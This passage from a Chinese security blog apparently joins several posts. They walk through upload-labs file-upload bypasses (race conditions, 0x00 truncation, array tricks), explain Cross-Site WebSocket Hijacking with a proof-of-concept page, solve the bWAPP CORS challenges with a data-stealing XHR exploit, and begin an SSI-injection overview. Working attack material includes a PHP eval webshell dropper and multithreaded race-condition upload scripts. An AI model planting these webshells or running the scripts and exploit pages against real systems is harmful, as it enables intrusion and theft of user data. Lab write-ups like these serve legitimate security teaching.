&lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; WinHex看到插入了后门代码： 上传后，成功利用： 0x11 Pass-17 利用条件竞争绕过查看提示/源码本关提示需要代码审计。 查看源码，发现是个条件竞争，上传成功的文件会被重命名，而上传失败的文件会先保存在upload目录中、然后再调用unlink()删除该不合法的上传文件： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 防御机制白名单校验后缀名，对上传成功的合法文件进行重命名，已上传的非法文件调用unlink()函数进行删除。 绕过方法代码存在条件竞争问题，非法文件上传后会先保存在upload目录中，然后再调用unlink()函数来删除，在这中间的时间差中，我们可以不断上传和访问非法的PHP文件，速度够快时就能触发成功。 本地准备上传的s.php文件为向upload目录写入shell.php后门，s.php代码如下： 1&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[c]);?&gt;');?&gt; 由于本地没有Pro版Burp，直接写脚本实现好了。 上传脚本，用到了hackhttp模块，直接将Burp中的请求报文复制进来就可以直接重放了，十分方便，同时采用线程池的方式： 123456789101112131415161718192021222324252627282930313233343536import hackhttpfrom multiprocessing.dummy import Pool as ThreadPoolurl = 'http://192.168.17.182:81/upload-labs/Pass-17/index.php'raw = '''POST /upload-labs/Pass-17/index.php HTTP/1.1Host: 192.168.17.182:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://192.168.17.166:81/upload-labs/Pass-17/index.phpContent-Type: multipart/form-data; boundary=---------------------------149578258030Content-Length: 367Connection: closeUpgrade-Insecure-Requests: 1-----------------------------149578258030Content-Disposition: form-data; name=\"upload_file\"; filename=\"s.php\"Content-Type: application/octet-stream&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[c]);?&gt;');?&gt;-----------------------------149578258030Content-Disposition: form-data; name=\"submit\"test-----------------------------149578258030--'''def upload(lists): hh = hackhttp.hackhttp() code,head,html,redirect_url,log = hh.http(url=url,raw=raw) print codepool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 请求脚本： 1234567891011121314151617import requestsimport sysfrom multiprocessing.dummy import Pool as ThreadPoolurl = 'http://192.168.17.182:81/upload-labs/upload/s.php'def upload(lists): r = requests.get(url=url) print r.status_code if r.status_code != 404: print \"OK!\" sys.exit(0)pool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 分别跑起来，过一会访问就成功了： 0x12 Pass-18 利用条件竞争+解析漏洞绕过查看提示/源码本关提示需要代码审计。 查看源码，index.php，主要调用了myupload.php中的类方法进行上传处理： 123456789101112131415161718192021222324252627282930313233343536373839$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125; myupload.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566class MyUpload&#123;...... var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;......&#125;; 代码不全，看到有个条件竞争问题，但如果只能上传图像文件而没有文件包含漏洞也没用，如果有文件包含漏洞那重命名而不去该文件名后缀也没用，因此本题考查点应该还有其他地方，下面我们看下完整的源码，其中会发现用于后缀名过滤的白名单如下： 123var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); 可以看到允许除了图像文件之外的其他文件名后缀，如压缩文件后缀zip、7z、rar等。 此时就清楚考点了，就是考查条件竞争+Apache解析漏洞。 其实myupload.php中保存文件的路径的代码是写得有点问题的，并不会将文件保存在upload目录中，原因是保存路径的字符串在拼接时少了个斜杠/，因此可自行在myupload.php的setDir()函数中将cls_upload_dir变量对应的语句加个斜杠即可： 1$this-&gt;cls_upload_dir = $dir.'/'; 防御机制白名单校验后缀名，检测文件大小、文件是否存在，然后上传文件再重命名文件。 绕过方法程序先上传文件再重命名文件，存在条件竞争问题，这里可上传Apache解析不了的后缀名文件，结合Apache解析漏洞来实现PHP代码执行。和Pass-17一样直接用Burp或脚本跑都OK。 我们知道Apache解析漏洞是由于用户错误配置导致的，而我本地的配置是不存在Apache解析漏洞的，因此这里改下配置方便演示，找到httpd-php.conf，将\\.php$中的$符去掉即可： 123&lt;FilesMatch &quot;\\.php&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 重启服务就存在Apache解析漏洞了。 直接上脚本，采用线程池的方式上传后门文件： 123456789101112131415161718192021222324252627282930313233343536import hackhttpfrom multiprocessing.dummy import Pool as ThreadPoolurl = 'http://192.168.17.182:81/upload-labs/Pass-18/index.php'raw = '''POST /upload-labs/Pass-18/index.php HTTP/1.1Host: 192.168.17.182:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://192.168.17.182:81/upload-labs/Pass-18/index.phpContent-Type: multipart/form-data; boundary=---------------------------159739342386Content-Length: 323Connection: closeUpgrade-Insecure-Requests: 1-----------------------------159739342386Content-Disposition: form-data; name=\"upload_file\"; filename=\"1.php.7z\"Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;-----------------------------159739342386Content-Disposition: form-data; name=\"submit\"upload-----------------------------159739342386--'''def upload(lists): hh = hackhttp.hackhttp() code,head,html,redirect_url,log = hh.http(url=url,raw=raw) print codepool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 运行脚本后，由于上传文件过多，导致条件竞争、来不及对上传文件进行重命名： 不管该脚本是在运行中还是运行结束后，该文件还是一直都存在的： 0x13 Pass-19 利用move_uploaded_file() 0x00截断绕过查看提示/源码提示是本pass的取文件名通过$_POST来获取。。 查看源码： 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 文件名是通过POST方式传入的，然后通过黑名单过滤文件后缀名，最后直接用文件名拼接保存的文件路径上传上去。 防御机制使用黑名单严格过滤文件后缀名。 绕过方法这关的绕过方法就很多了： CVE-2015-2348：move_uploaded_file()的0x00截断（本关的预期解法） 点绕过 ::$DATA绕过 空格绕过 大小写绕过 Apache解析漏洞绕过 0x14 Pass-20 数组+/.绕过查看提示/源码提示显示Pass-20来源于CTF，请审计代码！。 查看源码： 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 文件名可以通过POST的方式上传，且可以以数组形式上传；白名单校验MIME类型，白名单校验上传文件后缀名是否是图像后缀名，然后通过reset($file) . &#39;.&#39; . $file[count($file) - 1]获取文件名并拼接到上传的路径中上传文件。 防御机制白名单校验MIME类型和上传文件的后缀名。 绕过方法这里先看看几个函数的定义。 reset()函数：将内部指针指向数组中的第一个元素，并输出。 end()函数：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。 explode()函数：把字符串打散为数组。 我们知道，当以POST方式上传save_name时，程序会将该参数作为文件名；接着判断该文件名参数save_name是否为数组，若不是则直接’.’来切分为数组形式；ext变量是调用end()函数取数组最后的一个元素的值，若文件名参数save_name不是数组当然是正常的后缀名，但是若文件名参数save_name是数组则取的就是save_name中最后一个元素值；ext和白名单判断过滤后，通过reset()函数获取文件名，若文件名参数save_name不为数组、此时当然就是正常的文件名，但若文件名参数save_name为数组、则是取save_name中第一个元素值；而最后上传文件的后缀名是直接拼接该语句的值$file[count($file) - 1]即将最后一个元素值作为后缀名。 0x15 总结作者总结了两个图，这里直接贴上： Upload-Labs漏洞类型分类 如何判断上传漏洞类型 0x16 参考Upload-labs通关手册 upload-labs 文件上传靶机闯关记录","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"文件上传","slug":"文件上传","permalink":"https://www.mi1k7ea.com/tags/文件上传/"}]},{"title":"CSWSH漏洞总结","date":"2019-10-04T14:19:29.000Z","path":"2019/10/04/CSWSH漏洞总结/","text":"0x01 WebSocket基本概念一般的，Web应用的交互过程通常是客户端通过浏览器发出一个请求，服务器端接收请求后进行处理并返回结果给客户端，客户端浏览器将信息呈现。这种机制对于信息变化不是特别频繁的应用尚可，但却不适用于高并发与用户实时响应的场景，比如股票的实时信息、地图导航等。 于是，基于HTML5规范的、有Web TCP之称的WebSocket应运而生。 WebSocket是HTML5一种新的协议，它实现了浏览器和服务器全双工通信，更好地节省服务器资源和宽带并达到实时通讯，它建立在TCP之上，同HTTP一样通过TCP来传输数据，但和HTTP协议的不同点在于： WebSocket是持久化的协议，而HTTP是非持久连接； WebSocket是一种双向通信协议，在建立连接后，WebSocket服务器和浏览器/客户端代理都能主动地向对方发送或接收数据，就像Socket一样，而HTTP是单向通信协议； WebSocket需要类似TCP的三次握手连接，但和TCP不同的是，WebSocket是基于HTTP协议进行的握手，连接成功后才能相互通信； WebSocket具有功能强大、双向、低延迟等特征，特别是针对实时的、事件驱动的Web应用程序而言，不惜要的网络流量和延迟得以显著减少，通信效率和应用程序表现大大提升； WebSocket定义了两种URI格式：ws://和wss://，类似于HTTP和HTTPS，ws://使用明文传输，默认端口为80，wss://使用TLS加密传输，默认端口为443。 协议转换与报文特征WebSocket协议是基于HTTP协议进行的握手连接之后才转换过来的。通信协议从http://或https://切换到ws://或wss://后，表示应用已经切换到了WebSocket协议通信状态了。 websocket.org页面上，点击Connect会发现请求的协议为ws://，并且响应码是101，一旦服务器返回101响应即意味着完成了WebSocket协议的切换： 该站点也提供了客户端的HTML与JS代码来访问WebSocket，JS建立WebSocket连接的接口为new WebSocket(url, [protocol] )： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;WebSocket Test&lt;/title&gt; &lt;script language=\"javascript\" type=\"text/javascript\"&gt; var wsUri = \"wss://echo.websocket.org/\"; var output; function init() &#123; output = document.getElementById(\"output\"); testWebSocket(); &#125; function testWebSocket() &#123; websocket = new WebSocket(wsUri); websocket.onopen = function(evt) &#123; onOpen(evt) &#125;; websocket.onclose = function(evt) &#123; onClose(evt) &#125;; websocket.onmessage = function(evt) &#123; onMessage(evt) &#125;; websocket.onerror = function(evt) &#123; onError(evt) &#125;; &#125; function onOpen(evt) &#123; writeToScreen(\"CONNECTED\"); doSend(\"WebSocket rocks\"); &#125; function onClose(evt) &#123; writeToScreen(\"DISCONNECTED\"); &#125; function onMessage(evt) &#123; writeToScreen('&lt;span style=\"color: blue;\"&gt;RESPONSE: ' + evt.data+'&lt;/span&gt;'); websocket.close(); &#125; function onError(evt) &#123; writeToScreen('&lt;span style=\"color: red;\"&gt;ERROR:&lt;/span&gt; ' + evt.data); &#125; function doSend(message) &#123; writeToScreen(\"SENT: \" + message); websocket.send(message); &#125; function writeToScreen(message) &#123; var pre = document.createElement(\"p\"); pre.style.wordWrap = \"break-word\"; pre.innerHTML = message; output.appendChild(pre); &#125; window.addEventListener(\"load\", init, false); &lt;/script&gt; &lt;h2&gt;WebSocket Test&lt;/h2&gt; &lt;div id=\"output\"&gt;&lt;/div&gt; 访问该HTML文件就会自己发送WebSocket请求，在Frames一栏可看到进行交互的WebSocket协议信息： Burp能抓取到协议转换的这个101报文，但之后ws://或wss://协议的通信报文就抓不到了： 看到两个关键的头字段Connection和Upgrade，相当于告诉服务端要申请切换到WebSocket协议。其中Connection头字段指定Upgrade、申请切换协议，而Upgrade头字段指定为websocket、具体告诉服务端想切换的协议为WebSocket。 整个WebSocket协议切换报文如下： 其他一些头字段解释如下： HTTP头 是否必须 解释 Host 是 服务端主机名 Upgrade 是 固定值，”websocket” Connection 是 固定值，”Upgrade” Sec-WebSocket-Key 是 客户端临时生成的16字节随机值, base64编码 Sec-WebSocket-Version 是 WebSocket协议版本 Origin 否 可选, 发起连接请求的源 Sec-WebSocket-Accept 是(服务端) 服务端识别连接生成的随机值 Sec-WebSocket-Protocol 否 可选，客户端支持的协议 Sec-WebSocket-Extensions 否 可选， 扩展字段 两个重要的安全头，Sec-WebSocket-Key与Sec-WebSocket-Accept：客户端负责生成一个Base64编码过的随机数字作为Sec-WebSocket-Key，服务器则会将一个GUID和这个客户端的随机数一起生成一个散列Key作为Sec-WebSocket-Accept返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。 出于安全考虑而设计的，以“Sec-”开头的头字段可以避免被浏览器脚本读取到，这样攻击者就不能利用XHR来伪造WebSocket请求来执行跨协议攻击，因为XHR接口不允许设置Sec-开头的Header。 WebSocket属性 属性 描述 Socket.readyState 只读属性 readyState 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 - 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。 Socket.bufferedAmount 只读属性 bufferedAmount 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。 WebSocket事件 事件 事件处理程序 描述 open Socket.onopen 连接建立时触发 message Socket.onmessage 客户端接收服务端数据时触发 error Socket.onerror 通信发生错误时触发 close Socket.onclose 连接关闭时触发 WebSocket方法 方法 描述 Socket.send() 使用连接发送数据 Socket.close() 关闭连接 跨域跨域是WebSocket与生俱来的能力。 由前面协议转换可知，WebSocket客户端不仅仅局限于浏览器，因此WebSocket协议没有规范Origin必须相同，未指定ACAO，也没有规定服务器在握手阶段应该如何认证客户端身份，因而同源策略、CORS机制并不适用于WebSocket协议。 0x02 CSWSH漏洞CSWSH全称Cross-site WebSocket Hijacking，跨站点WebSocket劫持漏洞。 漏洞场景支持WebSocket协议的Web站点如股票实时查询、地图导航等，并且未对请求的Origin头字段进行校验。 漏洞原理CSWSH漏洞类似于全能型的CSRF漏洞，可读可写。 漏洞根源是WebSocket天生可跨域，不受同源策略的影响。在此基础上，若目标服务端未对WebSocket协议请求的Origin头字段进行校验，则会导致WebSocket协议请求可被攻击者劫持，从而窃取敏感信息。 下面看个修改过的图，是目标站点存在cookie校验机制的场景： 用户首先登录stock.com实时查询股票信息，其中该站点支持WebSocket，需要用户携带cookie访问； 接着用户被诱使在当前的浏览器访问beauty.com，其中加载了恶意JS代码到用户的浏览器中执行； 恶意JS代码通过WebSocket协议向stock.com站点发起请求，此时请求是用户浏览器发起的、是自动带上cookie信息的； stock.com收到恶意JS发送的WebSocket请求，由于未校验ws://请求的Origin头字段，在检测cookie合法后，返回敏感信息到用户浏览器； 用户浏览器中的恶意JS收到stock.com响应的WebSocket协议响应信息后，发往攻击者服务器，从而造成跨站点WebSocket劫持攻击； 漏洞挖掘进行CSWSH漏洞挖掘前需要准备好一款可以重放WebSocket协议报文的代理工具，Burp是做不到的，但是我们可以选择OWASP ZAP来实现。 一般的漏洞挖掘步骤： 找到支持WebSocket的站点； 使用ZAP等代理工具重放切换WebSocket协议的报文，其中修改Origin头查看服务端是否校验Origin头； 若未校验Origin头，则进一步发送WebSocket连接报文查看能否成功利用； 当然，切换协议的请求报文依然是可以使用Burp来完成的，这里修改Origin头之后再重放报文，发现成功响应101报文，证明该站点未校验Origin，可能存在CSWSH漏洞： 由于未找到合适的靶场环境，下面以https://demos.kaazing.com/echo/index.html为例演示，该站点建立的WebSocket连接是无需带cookie的。 先用ZAP代理抓取到101响应报文： 建立WebSocket连接后，通过该协议发送信息，在ZAP的WebSockets一栏可以查看到发送的内容： 使用ZAP重放切换WebSocket协议请求的报文，修改Origin头： 发送过去后响应101，说明协议切换成功，服务端并未校验Origin头： 下面就编写PoC ws_exp.html，直接拿前面的代码修改下，放置在攻击者的服务器上，原理就是XHR发起建立WebSocket协议请求，建立成功后尝试发送”Mi1k7ea“字符串信息通信，若返回内容为”Mi1k7ea“则证明能够正常进行WebSocket通信，即能够被跨站点劫持进行WebSocket通信： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;WebSocket Test&lt;/title&gt; &lt;script language=\"javascript\" type=\"text/javascript\"&gt; var wsUri = \"wss://demos.kaazing.com/echo\"; var output; function init() &#123; output = document.getElementById(\"output\"); testWebSocket(); &#125; function testWebSocket() &#123; websocket = new WebSocket(wsUri); websocket.onopen = function(evt) &#123; onOpen(evt) &#125;; websocket.onclose = function(evt) &#123; onClose(evt) &#125;; websocket.onmessage = function(evt) &#123; onMessage(evt) &#125;; websocket.onerror = function(evt) &#123; onError(evt) &#125;; &#125; function onOpen(evt) &#123; writeToScreen(\"CONNECTED\"); doSend(\"Mi1k7ea\"); &#125; function onClose(evt) &#123; writeToScreen(\"DISCONNECTED\"); &#125; function onMessage(evt) &#123; writeToScreen('&lt;span style=\"color: blue;\"&gt;RESPONSE: ' + evt.data+'&lt;/span&gt;'); if (\"Mi1k7ea\" == evt.data) &#123;alert(\"存在CSWSH漏洞!\");&#125; websocket.close(); &#125; function onError(evt) &#123; writeToScreen('&lt;span style=\"color: red;\"&gt;ERROR:&lt;/span&gt; ' + evt.data); &#125; function doSend(message) &#123; writeToScreen(\"SENT: \" + message); websocket.send(message); &#125; function writeToScreen(message) &#123; var pre = document.createElement(\"p\"); pre.style.wordWrap = \"break-word\"; pre.innerHTML = message; output.appendChild(pre); &#125; window.addEventListener(\"load\", init, false); &lt;/script&gt; &lt;h2&gt;WebSocket Test&lt;/h2&gt; &lt;div id=\"output\"&gt;&lt;/div&gt; 当然，PoC很简单，具体操作可自行发挥。 诱使已登录目标站点的用户在同一浏览器访问攻击者服务器上的ws_exp.html（当然这里是假设场景），看到能正常建立WebSocket连接并正常通信： 此时Origin头是指向攻击者服务器的，由于后台未校验Origin导致可被跨站点劫持： 0x03 检测与防御检测方法修改请求报文中的Origin头字段，重放该WebSocket协议升级请求，若服务器返回101响应则表示连接成功即未对源进行检测，则可能存在CSWSH漏洞。 最好是进一步测试是否可以发送WebSocket消息，若这个WebSocket连接能够发送/接受消息的话，则完全证明CSWSH漏洞的存在。 防御方法 使用token机制； 使用白名单校验请求报文的Origin头字段； 0x04 参考深入理解跨站点 WebSocket 劫持漏洞的原理及防范 小心 ！跨站点websocket劫持！ 挖洞经验 | 利用跨站WebSocket劫持（CSWH）实现账户劫持","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CSWSH","slug":"CSWSH","permalink":"https://www.mi1k7ea.com/tags/CSWSH/"}]},{"title":"bWAPP之Cross-Origin Resource Sharing (AJAX)","date":"2019-09-28T15:57:15.000Z","path":"2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/","text":"这里做下BWAPP靶场的Cross-Origin Resource Sharing (AJAX)的题目。 0x01 Low级正常用户登录后访问页面，提示尝试从恶意站点去通过Ajax请求来窃取Neo的秘密： 这里用户可以点击“secret”去查看Neo的秘密，并且可看到该页面响应报文的ACAO字段设置为*，但并未设置ACAC字段（想必是避免浏览器最后一道防线吧）： 接着，我们可以直接编写我们的CORS跨域漏洞的Exp，因为无ACAC头，即无需带Cookie访问，因此直接将withCredentials那句注释掉就好： 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE&gt;&lt;html&gt;&lt;h1&gt;Hello I evil page. &lt;/h1&gt;&lt;script type=\"text/javascript\"&gt;function loadXMLDoc()&#123; var xhr1; if(window.XMLHttpRequest) &#123; xhr1 = new XMLHttpRequest(); &#125; else &#123; xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; xhr1.onreadystatechange=function() &#123; if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response &#123; var datas=xhr1.responseText; alert(datas); &#125; &#125; xhr1.open(\"GET\",\"http://192.168.17.147/bWAPP/secret-cors-1.php\",\"true\") //request user page. //xhr1.withCredentials = true; //request with cookie xhr1.send();&#125;loadXMLDoc();&lt;/script&gt;&lt;/html&gt; 将其放置在攻击者服务器上，诱使已登录用户访问，然后就能窃取Neo的秘密信息了： 0x02 Medium级确实是升级了，且给了提示说秘密信息只能让来自intranet.itsecgames.com域名的请求访问： 直接点击“srcret”访问是查看不到秘密信息的，因为此时请求的来源是BWAPP自己的域名而非intranet.itsecgames.com域名： 因此，若想成功访问该页面的秘密信息，我们需要添加Origin头字段并赋值为intranet.itsecgames.com域名： 接着，可能第一时间会想到，在Low级的EXP基础上，添加一条XHR设置请求头字段的语句，如下： 1xhr1.setRequestHeader(&quot;Origin&quot;, &quot;http://intranet.itsecgames.com&quot;); 然而，这样是行不通的，为啥？——因为XHR请求头并不是什么字段都可以设置的，在W3C标准里面明确规定了以下请求头信息是由浏览器控制的，开发者是不允许设置这些请求头字段的，且不区分大小写： 1234567891011121314151617181920212223Accept-CharsetAccept-EncodingAccess-Control-Request-HeadersAccess-Control-Request-MethodConnectionContent-LengthCookieCookie2DateDNTExpectHostKeep-AliveOriginRefererTETrailerTransfer-EncodingUpgradeUser-AgentViaProxy-xxxSec-xxx 目前本人想到的解决办法就是注册该域名，这里本地测试就该hosts文件来实现： 然后exp.html和Low级是一模一样的，只是修改了想要窃取数据的页面地址为secret-cors-2.php： 0x03 High级最后看下High级，提示不信任本地内网区域： 用户是可以直接访问得到秘密信息的，且可以看到并未设置ACAO头字段： 没有ACAO字段，也就是说不允许CORS进行跨域访问了，因此就不存在CORS跨域漏洞了。 0x04 源码分析最后从代码层面看下吧。 sm_cors.php的关键代码如下，根据不同的级别引用不同的PHP文件： 12345678910111213141516171819202122switch($_COOKIE[\"security_level\"])&#123; case \"0\" : $hero = \"Neo\"; $file = \"secret-cors-1.php\"; break; case \"1\" : $hero = \"Wolverine\"; $file = \"secret-cors-2.php\"; $hint = \"HINT: the secret is only available to requests from intranet.itsecgames.com...\"; break; case \"2\" : $hero = \"Johnny\"; $file = \"secret-cors-3.php\"; $hint = \"HINT: never trust local intranet zones!\"; break; default : $hero = \"Neo\"; $file = \"secret-cors-1.php\"; break;&#125; 分别看下几个不同级别的PHP文件。 Low级，secret-cors-1.php，设置ACAO字段值为*且无ACAC字段，允许任何外域访问该页面并无需携带cookie，典型的CORS跨域漏洞： 12345&lt;?phpheader(\"Content-Type: text/plain\");header('Access-Control-Allow-Origin: *');echo \"Neo's secret: Oh why didn't I took that BLACK pill?\";?&gt; Medium级，secret-cors-2.php，检查请求头是否存在Origin字段且其值是否为http://intranet.itsecgames.com，同时设置响应报文头ACAO字段也为该域名： 12345678910111213&lt;?phpheader(\"Content-Type: text/plain\");if(isset($_SERVER[\"HTTP_ORIGIN\"]) and $_SERVER[\"HTTP_ORIGIN\"] == \"http://intranet.itsecgames.com\")&#123; header(\"Access-Control-Allow-Origin: http://intranet.itsecgames.com\"); echo \"Wolverine's secret: What's a Magneto?\"; &#125;else&#123; echo \"This is just a normal page with no secrets :)\";&#125;?&gt; High级，secret-cors-3.php，未设置ACAO头字段，不允许跨域访问该页面，当然就不存在CORS跨域漏洞了： 1234&lt;?phpheader(\"Content-Type: text/plain\");echo \"Johnny's secret: I'm the Ghost Rider!\";?&gt; 小结一下：bWAPP靶场CORS题目并未涉及到带cookie访问，即未设置ACAC字段，可以说是是方便Low级的攻击利用，而在Medium级可自行添加ACAC字段来尝试看下区别，这里就不多说了。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CORS","slug":"CORS","permalink":"https://www.mi1k7ea.com/tags/CORS/"}]},{"title":"SSI注入漏洞总结","date":"2019-09-28T03:47:16.000Z","path":"2019/09/28/SSI注入漏洞总结/","text":"现在大多数Web服务已经很少用到SSI了，但是偶尔还是能碰碰运气的。 0x01 基本概念何为SSISSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。 SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 基本原理就是：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 SHTML文件SHTML即Server-Parsed HTML。 shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理。 Web服务启动SSINginx在Nginx中，开启SSI只需在配置文件中添加如下几项： 123ssi on;ssi_silent_errors off;ssi_types text/shtml; 如： 12345678910111213server&#123; listen 80; server_name www.hello.com # 配置SSL ssi on; # 开启SSI支持 ssi_silent_errors on; # 默认为off，设置为on则在处理SSI文件出错时不输出错误信息 ssi_types text/html; # 需要支持的shtml 